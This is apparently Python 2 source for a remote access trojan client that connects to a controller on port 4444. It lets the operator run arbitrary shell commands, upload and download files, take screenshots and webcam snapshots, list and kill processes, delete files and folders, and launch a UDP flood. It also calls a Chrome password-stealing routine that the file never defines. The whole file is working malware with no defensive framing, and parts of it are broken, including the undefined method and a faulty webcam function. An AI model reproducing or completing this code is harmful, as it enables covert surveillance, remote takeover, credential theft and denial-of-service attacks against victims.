import socket, os, signal, platform, locale, shutil, psutil, mss, time, subprocess, sqlite3, random
#import cv2, win32crypt
from ctypes import *

class CMDA:
	def uploadFile(self, s):
		s.send(" ")
		filename = s.recv(1024)
		if os.path.isfile(filename):
			s.send("EXISTS {}".format(str(os.path.getsize(filename))))
			userResponse = s.recv(1024)
			if userResponse[:2] == "OK":
				with open(filename, "rb") as f:
					bytesToSend = f.read(4096)
					s.send(bytesToSend)
					while bytesToSend != "":
						bytesToSend = f.read(1024)
						s.send(bytesToSend)
			else:
				s.send("OK")
		else:
			s.send("ERR")

	def downloadFile(self, s):
	    pwd = os.getcwd()
	    s.send(" ")
	    filename = s.recv(1024)
	    if filename[:3] == "ERR":
			s.send(" ")
			return
	    path = s.recv(1024)
	    if path != "None":
			try:
				os.chdir(path)
			except:
				s.send("ERR")
				return
	    s.send(" ")
	    data = s.recv(1024)
	    if data[:6] == "EXISTS":
	        filesize = long(data[6:])
	        s.send("OK")
	        f = open(filename, "wb")
	        data = s.recv(1024)
	        totalRecv = len(data)
	        f.write(data)
	        while totalRecv < filesize:
	            data = s.recv(1024)
	            totalRecv += len(data)
	            f.write(data)
		os.chdir(pwd)
	    else:
	    	s.send(" ")

	def getcurrentprocess(self):
		user32 = windll.user32
		kernel32 = windll.kernel32

		hwnd = user32.GetForegroundWindow()
		pid = c_ulong(0)
		user32.GetWindowThreadProcessId(hwnd, byref(pid))
		
		window_title = create_string_buffer("\x00" * 512)
		length = user32.GetWindowTextA(hwnd, byref(window_title),512)

		currentprocess = "[PID: {} - {} ]".format(int(pid.value), window_title.value)

		kernel32.CloseHandle(hwnd)

		return currentprocess

	def flood(self, host, port, duration):
	    su = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	    bytes = random._urandom(1024)
	    timeout = time.time() + duration
	    while True:
	    	print "timeout : {}\ntime.time : {}".format(timeout, time.time())
	        if time.time() > timeout:
	            break
	        su.sendto(bytes, (host, port))
	        print "Attacking %s at the port %s "%(host, port)

	def screenshot(self, s):
		with mss.mss() as sct:
			filename = sct.shot(output="screenshotFS.png")
		self.uploadFile(s)
		os.remove(filename)

	def webcam_snap(self):
		filename = "wpicture.png"
		camera = cv2.VideoCapture(0)
		time.sleep(00.1)
		return_value, image = camera.read()
		cv2.imwrite(filename, image)
		uploadFile(s)
		os.remove(filename)

	def ls(self):
		dirs = os.listdir(os.getcwd())
		if len(dirs) > 0:
			files = "\n".join(dirs)
			result = files
		else:
			result = "//Nothing//"
		return result

	def ps(self):
		allprocess = ""
		for proc in psutil.process_iter():
			pid = proc.pid
			name = proc.name()
			allprocess += "\n{:37}  {:>5}".format(name, pid) 
		return allprocess

	def searchproc(self, cmd):
		allprocess = ""
		for proc in psutil.process_iter():
			pid = proc.pid
			name = proc.name()
			if cmd in name:
				allprocess = allprocess + "\n{:37}  {:>5}".format(name, pid)
		if len(allprocess) > 0:
			result = allprocess
		else:
			result = "Null"
		return result

	def cd(self, cmd):
		try:
			os.chdir(cmd)
			result = "OK"
		except WindowsError:
			result = "ERR The directory doesn't exist"
		return result

	def kill(self, cmd):	
		try:
			os.kill(int(cmd), signal.SIGTERM)
			result = "OK"
		except:
			result = "ERR Error".format(cmd)
		return result

	def rm(self, cmd):
		try:
			os.remove(cmd)
			result = "OK"
		except OSError:
			result = "ERR '{}' is not a file".format(cmd)
		return result

	def rmdir(self, cmd):
		try:
			shutil.rmtree(cmd)
			result = "OK"
		except OSError:
			result = "ERR '{}' is not a folder".format(cmd)
		return result

	def force2(self, cmd):
		try:
			os.system(cmd)
			result = "OK"
		except:
			result = "ERR '{}' is not a valid command".format(cmd[7:])
		return result

def Main():
	host = "localhost"
	port = 4444
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	FCMD = CMDA()
	while True:
		cmd = s.recv(1024)
		if cmd == "download":
			FCMD.uploadFile(s)

		elif cmd == "upload":
			FCMD.downloadFile(s)

		elif cmd == "currentprocess":
			currentprocess = FCMD.getcurrentprocess()
			s.send(currentprocess)

		elif cmd == "getchromecookie":
			log = FCMD.getchromepassword()
			s.send(log)
		

		elif cmd == "screenshot":
			FCMD.screenshot(s)	

		elif cmd[:5] == "flood":
			arg = cmd.split(" ")
			FCMD.flood(arg[1], port, int(arg[2]))
			s.send("OK")

		elif cmd == "webcam_snap":
			FCMD.webcam_snap()	

		elif cmd[:6] == "force ":
			p = subprocess.Popen(str(cmd[6:]), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			(stdout, stderr) = p.communicate()
			output = str(stdout + stderr)
			s.send(output)

		elif cmd[:6] == "force2":
			result = FCMD.force2(cmd[7:])
			s.send(result)

		elif cmd == "pwd":
			s.send(os.getcwd())

		elif cmd == "ls":
			afile = FCMD.ls()
			s.send(afile)

		elif cmd[:2] == "cd":
			result = FCMD.cd(cmd[3:])
			s.send(result)

		elif cmd[:4] == "kill":
			result = FCMD.kill(cmd[5:])
			s.send(result)

		elif cmd == "ps":
			allprocess = FCMD.ps()
			s.send(allprocess)

		elif cmd[:6] == "search":
			allprocess = FCMD.searchproc(cmd[7:])
			s.send(allprocess)

		elif cmd == "getpid":
			s.send(str(os.getpid()))

		elif cmd == "sysinfo":
			sysinfo = "Computer : {}\nOS Version : {}\nSystem Language : {}\nProcessor : {}".format(platform.uname()[1], platform.platform(), locale.getdefaultlocale()[0], platform.processor())
			s.send(sysinfo)

		elif cmd[:3] == "rm ":
			result = FCMD.rm(cmd[3:])
			s.send(result)

		elif cmd[:5] == "rmdir":
			result = FCMD.rmdir(cmd[6:])
			s.send(result)

		elif cmd == "hostname":
			s.send(str(socket.gethostname()))

		else:
			s.send(" ")

	s.close()

if __name__ == "__main__":
	Main()
